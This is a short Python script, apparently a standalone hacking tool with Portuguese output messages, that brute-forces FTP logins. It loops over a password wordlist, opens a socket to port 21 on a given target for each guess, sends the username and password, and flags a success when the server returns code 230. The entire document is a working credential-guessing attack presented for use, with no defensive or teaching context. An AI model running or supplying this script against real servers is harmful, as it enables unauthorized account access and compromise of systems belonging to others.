#!/usr/bin/python
import socket,sys,re

if len(sys.argv) != 3:
	print ("Modo de uso: python izzyftp.py 127.0.0.1 usuario")
	sys.exit()
target = sys.argv[1]
usuario = sys.argv[2]

f = open('wordlist.txt')
for palavra in f.readlines():
	
	print ("Realizando brute force FTP: %s:%s"%(usuario,palavra))

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target,21))
	s.recv(1024)
	
	s.send("User "+usuario+"\r\n")
	s.recv(1024)
	s.send("Pass "+palavra+"\r\n")
	resposta = s.recv(1024)
	s.send("QUIT\r\n")
	
	if re.search('230', resposta):
		print ("[+] senha encontrada --->", palavra)
		break


